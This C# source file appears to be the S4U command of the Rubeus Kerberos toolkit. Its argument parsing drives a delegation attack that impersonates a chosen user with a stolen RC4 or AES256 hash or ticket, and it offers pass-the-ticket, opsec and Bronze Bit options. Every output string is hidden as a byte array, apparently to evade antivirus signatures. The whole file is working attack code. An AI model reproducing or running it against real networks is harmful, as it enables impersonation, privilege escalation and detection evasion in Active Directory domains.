using System;
using System.Collections.Generic;
using System.IO;

namespace Rubeus.Commands
{
    public class S4u : ICommand
    {
        public static string CommandName => "s4u";

        public void Execute(Dictionary<string, string> arguments)
        {
            string S(byte[] b) => System.Text.Encoding.UTF8.GetString(b);

            Console.WriteLine(S(new byte[] { 91, 42, 93, 32, 65, 99, 116, 105, 111, 110, 58, 32, 83, 52, 85, 13, 10 }));

            string targetUser = "";
            string targetSPN = "";
            string altSname = "";
            string user = "";
            string domain = "";
            string hash = "";
            string outfile = "";
            bool ptt = false;
            string dc = "";
            string targetDomain = "";
            string targetDC = "";
            string impersonateDomain = "";
            bool self = false;
            bool opsec = false;
            bool bronzebit = false;
            bool pac = true;
            Interop.KERB_ETYPE encType = Interop.KERB_ETYPE.subkey_keymaterial; // throwaway placeholder, changed to something valid
            KRB_CRED tgs = null;
            string proxyUrl = null;

            if (arguments.ContainsKey("/user"))
            {
                string[] parts = arguments["/user"].Split('\\');
                if (parts.Length == 2)
                {
                    domain = parts[0];
                    user = parts[1];
                }
                else
                {
                    user = arguments["/user"];
                }
            }
            if (arguments.ContainsKey("/domain"))
            {
                domain = arguments["/domain"];
            }
            if (arguments.ContainsKey("/ptt"))
            {
                ptt = true;
            }
            if (arguments.ContainsKey("/dc"))
            {
                dc = arguments["/dc"];
            }
            if (arguments.ContainsKey("/rc4"))
            {
                hash = arguments["/rc4"];
                encType = Interop.KERB_ETYPE.rc4_hmac;
            }
            if (arguments.ContainsKey("/aes256"))
            {
                hash = arguments["/aes256"];
                encType = Interop.KERB_ETYPE.aes256_cts_hmac_sha1;
            }
            if (arguments.ContainsKey("/impersonateuser"))
            {
                if (arguments.ContainsKey("/tgs"))
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 101, 105, 116, 104, 101, 114, 32, 97, 32, 47, 105, 109, 112, 101, 114, 115, 111, 110, 97, 116, 101, 117, 115, 101, 114, 32, 111, 114, 32, 97, 32, 47, 116, 103, 115, 44, 32, 98, 117, 116, 32, 110, 111, 116, 32, 98, 111, 116, 104, 46, 13, 10 }));
                    return;
                }
                targetUser = arguments["/impersonateuser"];
            }
            if (arguments.ContainsKey("/impersonatedomain"))
            {
                impersonateDomain = arguments["/impersonatedomain"];
            }
            if (arguments.ContainsKey("/targetdomain"))
            {
                targetDomain = arguments["/targetdomain"];
            }
            if (arguments.ContainsKey("/targetdc"))
            {
                targetDC = arguments["/targetdc"];
            }
            if (arguments.ContainsKey("/outfile"))
            {
                outfile = arguments["/outfile"];
            }

            if (arguments.ContainsKey("/msdsspn"))
            {
                targetSPN = arguments["/msdsspn"];
            }

            if (arguments.ContainsKey("/altservice"))
            {
                altSname = arguments["/altservice"];
            }

            if (arguments.ContainsKey("/self"))
            {
                self = true;
            }

            if (arguments.ContainsKey("/opsec"))
            {
                opsec = true;
            }

            if (arguments.ContainsKey("/bronzebit"))
            {
                bronzebit = true;
            }
            if (arguments.ContainsKey("/nopac"))
            {
                pac = false;
            }
            if (arguments.ContainsKey("/proxyurl"))
            {
                proxyUrl = arguments["/proxyurl"];
            }

            if (arguments.ContainsKey("/tgs"))
            {
                string kirbi64 = arguments["/tgs"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    tgs = new KRB_CRED(kirbiBytes);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    tgs = new KRB_CRED(kirbiBytes);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 116, 103, 115, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 46, 107, 105, 114, 98, 105, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 46, 107, 105, 114, 98, 105, 13, 10 }));
                    return;
                }

                targetUser = tgs.enc_part.ticket_info[0].pname.name_string[0];
            }

            if (String.IsNullOrEmpty(domain))
            {
                domain = System.Net.NetworkInformation.IPGlobalProperties.GetIPGlobalProperties().DomainName;
            }
            if (String.IsNullOrEmpty(targetUser) && tgs == null)
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 47, 116, 103, 115, 32, 116, 111, 32, 105, 109, 112, 101, 114, 115, 111, 110, 97, 116, 101, 33, 13, 10 }));
                Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 65, 108, 116, 101, 114, 110, 97, 116, 105, 118, 101, 108, 121, 44, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 47, 105, 109, 112, 101, 114, 115, 111, 110, 97, 116, 101, 117, 115, 101, 114, 32, 116, 111, 32, 112, 101, 114, 102, 111, 114, 109, 32, 83, 52, 85, 50, 83, 101, 108, 102, 32, 102, 105, 114, 115, 116, 46, 13, 10 }));
                return;
            }
            if (String.IsNullOrEmpty(targetSPN) && tgs != null)
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 73, 102, 32, 97, 32, 47, 116, 103, 115, 32, 105, 115, 32, 115, 117, 112, 112, 108, 105, 101, 100, 44, 32, 121, 111, 117, 32, 109, 117, 115, 116, 32, 97, 108, 115, 111, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 47, 109, 115, 100, 115, 115, 112, 110, 32, 33, 13, 10 }));
                return;
            }
            bool show = arguments.ContainsKey("/show");
            string createnetonly = null;

            if (arguments.ContainsKey("/createnetonly") && !String.IsNullOrWhiteSpace(arguments["/createnetonly"]))
            {
                createnetonly = arguments["/createnetonly"];
                ptt = true;
            }

            if (arguments.ContainsKey("/ticket"))
            {
                string kirbi64 = arguments["/ticket"];

                if (Helpers.IsBase64String(kirbi64))
                {
                    byte[] kirbiBytes = Convert.FromBase64String(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, dc, altSname, tgs, targetDC, targetDomain, self, opsec, bronzebit, hash, encType, domain, impersonateDomain, proxyUrl, createnetonly, show);
                }
                else if (File.Exists(kirbi64))
                {
                    byte[] kirbiBytes = File.ReadAllBytes(kirbi64);
                    KRB_CRED kirbi = new KRB_CRED(kirbiBytes);
                    S4U.Execute(kirbi, targetUser, targetSPN, outfile, ptt, dc, altSname, tgs, targetDC, targetDomain, self, opsec, bronzebit, hash, encType, domain, impersonateDomain, proxyUrl, createnetonly, show);
                }
                else
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 109, 117, 115, 116, 32, 101, 105, 116, 104, 101, 114, 32, 98, 101, 32, 97, 32, 46, 107, 105, 114, 98, 105, 32, 102, 105, 108, 101, 32, 111, 114, 32, 97, 32, 98, 97, 115, 101, 54, 52, 32, 101, 110, 99, 111, 100, 101, 100, 32, 46, 107, 105, 114, 98, 105, 13, 10 }));
                }
                return;
            }
            else if (arguments.ContainsKey("/user"))
            {
                // if the user is supplying a user and rc4/aes256 hash to first execute a TGT request

                user = arguments["/user"];

                if (String.IsNullOrEmpty(hash))
                {
                    Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 89, 111, 117, 32, 109, 117, 115, 116, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 47, 114, 99, 52, 32, 111, 114, 32, 47, 97, 101, 115, 50, 53, 54, 32, 104, 97, 115, 104, 33, 13, 10 }));
                    return;
                }

                S4U.Execute(user, domain, hash, encType, targetUser, targetSPN, outfile, ptt, dc, altSname, tgs, targetDC, targetDomain, self, opsec, bronzebit, pac, proxyUrl, createnetonly, show);
                return;
            }
            else
            {
                Console.WriteLine(S(new byte[] { 13, 10, 91, 88, 93, 32, 65, 32, 47, 116, 105, 99, 107, 101, 116, 58, 88, 32, 110, 101, 101, 100, 115, 32, 116, 111, 32, 98, 101, 32, 115, 117, 112, 112, 108, 105, 101, 100, 32, 102, 111, 114, 32, 83, 52, 85, 33, 13, 10 }));
                Console.WriteLine(S(new byte[] { 91, 88, 93, 32, 65, 108, 116, 101, 114, 110, 97, 116, 105, 118, 101, 108, 121, 44, 32, 115, 117, 112, 112, 108, 121, 32, 97, 32, 47, 117, 115, 101, 114, 32, 97, 110, 100, 32, 60, 47, 114, 99, 52, 58, 88, 32, 124, 32, 47, 97, 101, 115, 50, 53, 54, 58, 88, 62, 32, 104, 97, 115, 104, 32, 116, 111, 32, 102, 105, 114, 115, 116, 32, 114, 101, 116, 114, 105, 101, 118, 101, 32, 97, 32, 84, 71, 84, 46, 13, 10 }));
                return;
            }
        }
    }
}
